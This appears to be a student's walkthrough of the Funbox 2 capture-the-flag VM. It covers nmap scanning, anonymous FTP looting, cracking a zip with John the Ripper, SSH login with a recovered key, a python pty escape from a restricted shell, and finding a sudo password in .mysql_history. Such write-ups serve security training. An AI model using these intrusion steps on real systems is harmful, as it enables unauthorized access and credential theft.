<div style="background-color: rgb(50, 50, 50);">
<span style ="color:grey">

# \[----Funbox 2 Guide----\]

## [----Setup Requirments----]
First run a Kali Linux Machine, PFSense 2, and the Funbox 2 box.

Login on the Kali Linux Machine and launch a terminal

## \[----Tools Used----\]
`nmap`</br>
`ftp`</br>
`ssh`</br>
`python3`</br>
`johntheripper`</br>
## \[----Enumeration----\]

at \[03/29/23 1:09:35\] i ran the following command `sudo namp -PO 192.168.10.0/24` to find the machine's ip and relevant information about services using `-PO` to bypass filtering on the ports of the machine which returned the following


> Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-29 13:09 EDT</br>
> Nmap scan report for pfSense.home.arpa (192.168.10.1)</br></br>
> Host is up (0.00046s latency).</br>
> Not shown: 998 filtered tcp ports (no-response)</br>
> PORT   STATE SERVICE</br>
> 53/tcp open  domain</br>
> 80/tcp open  http</br>
> MAC Address: 08:00:27:B8:0B:67 (Oracle VirtualBox virtual NIC)
>
> Nmap scan report for 192.168.10.6</br>
> Host is up (0.00031s latency).</br>
> Not shown: 997 closed tcp ports (reset)</br>
> PORT   STATE SERVICE</br>
> 21/tcp open  ftp</br>
> 22/tcp open  ssh</br>
> 80/tcp open  http</br>
> MAC Address: 08:00:27:CF:01:65 (Oracle VirtualBox virtual NIC)
>
> Nmap scan report for 192.168.10.3</br>
> Host is up (0.0000030s latency).</br>
> All 1000 scanned ports on 192.168.10.3 are in ignored states.</br>
> Not shown: 1000 closed tcp ports (reset)
>
> Nmap done: 256 IP addresses (3 hosts up) scanned in 6.89 seconds
> 

this scan revealed the following services `FTP`, `SSH`, and `HTTP` running on the vulnerable machine at the ip address of `192.168.10.6`

## \[----FTP----\]

using this information at \[03/29/23 1:16:27\] i ran `ftp 192.168.10.6 -p 21` to access the relevant running FTP service logging in under the anonymous username

upon logging on under the **anonymous** user account with no password i ran `ls -la` to retrieve the directory contents of the server which returned the following information


> 229 Entering Extended Passive Mode (|||31812|)</br>
> 150 Opening ASCII mode data connection for file list</br>
> drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 .</br>
> drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 ..</br>
> -rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip</br>
> -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip</br>
> -rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users</br>
> -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip</br>
> 226 Transfer complete
> 

with the gained knowledge of the accessible files i used `get` to obtain `.@users`, `.@admins` and all the `.zip` files located on the server

upon collection of the following files i exited the ftp server using `exit` at \[03/29/23 1:25:11\]  

## \[----FTP Server File Analysis----\]

using the command `cat .@users` in the directory containing the downloaded files off the ftp server i gained the following **Valuable** information


> Hi Users,
>
> be carefull with your keys. Find them in %yourname%.zip.</br>
> The passwords are the old ones.
>
> Regards</br>
> root
> 

using this information i attempted to extract files from `tom.zip` using `unzip` which revealed a password requirment on the zip file.


> Archive:  tom.zip</br>
> \[tom.zip\] id_rsa password: 
> 

with this information i used the command of `zip2john tom.zip >> tom.hash` to generate a **johntheripper**  crackable hash

doing the command `john tom.hash` at \[03/29/23 1:36:36\] revealed the following information including the password for the zip


> Using default input encoding: UTF-8</br>
> Loaded 1 password hash (PKZIP [32/64])</br>
> Will run 4 OpenMP threads</br>
> Proceeding with single, rules:Single</br>
> Press 'q' or Ctrl-C to abort, almost any other key for status</br>
> Almost done: Processing the remaining buffered candidate passwords, if any.</br>
> Proceeding with wordlist:/usr/share/john/password.lst</br>
> **iubire**           (tom.zip/id_rsa)     </br>
> 1g 0:00:00:00 DONE 2/3 (2023-03-29 13:36) 20.00g/s 937980p/s 937980c/s 937980C/s 123456..felipes</br>
> Use the "--show" option to display all of the cracked passwords reliably</br>
> Session completed. 
> 

with this i did `unzip tom.zip` and entered the password of `iubire` giving me tom's id_rsa key

## \[----Accessing the Machine And Elevating Privilege----\]

with the newly acquired id_rsa key i ran `ssh tom@192.168.10.6 -i id_rsa` at \[03/29/23 1:38:21\] gaining remote acess to the machine via a ssh shell

I quickly upon connecting and opening a shell to the machine learned that the machine was running under restricted shell to bypass this i ran the following `python3 -c 'import pty; pty.spawn("/bin/bash/")'` to gain a unrestricted shell on the machine.

with this new found unrestriction i ran `ls -la` to reveal the contents of tom's home directory


> total 40</br>
> drwxr-xr-x 5 tom  tom  4096 Jul 25  2020 .</br>
> drwxr-xr-x 3 root root 4096 Jul 25  2020 ..</br>
> -rw------- 1 tom  tom     6 Jul 25  2020 .bash_history</br>
> -rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout</br>
> -rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc</br>
> drwx------ 2 tom  tom  4096 Jul 25  2020 .cache</br>
> drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg</br>
> -rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history</br>
> -rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile</br>
> drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh</br>
> -rw-r--r-- 1 tom  tom     0 Jul 25  2020 .sudo_as_admin_successful</br>
> -rw------- 1 tom  tom     0 Jul 25  2020 .viminfo
> 

using these contents i quickly strated running `cat` to look at the contents of the files

the following in order revealed no useful information `.viminfo`, `.sudo_as_admin_successful`, `.profile`.

However upon running `cat .mysql_history` it revealed the following 


> \_HiStOrY\_V2\_
> show\040databases;</br>
> quit</br>
> create\040database\040'support';</br>
> create\040database\040support;</br>
> use\040support</br>
> create\040table\040users;</br>
> show\040tables</br>
> ;</br>
>select\040*\040from\040support</br>
> ;</br>
> show\040tables;</br>
> select\040*\040from\040support;</br>
> insert\040into\040support\040(tom,\040xx11yy22!);</br>
> quit</br>
>

due to the following newfound information i attempted the following command `sudo -l` using `xx11yy22!` as the password required for sudo execution to see if tom had sudo privileges which gave the following output


> Matching Defaults entries for tom on funbox2:</br>
>    env_reset, mail_badpass,</br>
>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
> </br></br>
> 

> User tom may run the following commands on funbox2:</br>
>    (ALL : ALL) ALL
> 

with this found information i used `sudo -i` to launch a interative shell as the root user and was able to `cat flag.txt` to get the end goal output.

## \[----End Result Analysis----\]
due to the improperly secured services on the host of `192.168.10.6` it is possible to find and abuse information from the service of `ftp` as the **Anonymous** user account which requires no password to gain information and later a id_rsa key file. Through this it is possible to login to a user ssh account and by using `MySql` command logging find the relevant user password which has complete sudo access and gain root level access.
